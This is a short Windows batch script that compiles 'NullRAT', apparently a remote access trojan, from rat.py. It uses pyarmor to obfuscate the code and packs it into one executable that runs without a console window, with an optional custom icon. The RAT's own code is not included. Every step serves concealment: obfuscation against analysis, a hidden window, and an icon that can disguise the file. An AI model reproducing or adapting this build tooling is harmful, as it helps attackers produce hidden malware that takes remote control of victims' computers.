@echo off & title Compiling RAT & color 3

choice /c YN /n /m "Do you want a custom icon? (Y or N)"
if /I "%errorlevel%"=="1" (goto icon_compile) 
if /I "%errorlevel%"=="2" (goto non_icon_compile)
exit /b 1

:non_icon_compile
echo. & echo Compiling NullRAT
echo ----------------- & echo.
pyarmor pack --clean -e "--onefile --noconsole" rat.py & cls 
if %errorlevel% == 0 (echo Successfully compiled! & exit /b 0) else (echo Not compiled successfully :[ & echo. & pause & exit /b 1)

:icon_compile
echo. & echo Compiling NullRAT with icon
echo --------------------------- & echo.
pyarmor pack --clean -e "--onefile --icon=custom_icon.ico --noconsole" rat.py & cls 
if %errorlevel% == 0 (echo Successfully compiled! & exit /b 0) else (echo Not compiled successfully :[ & echo. & pause & exit /b 1)
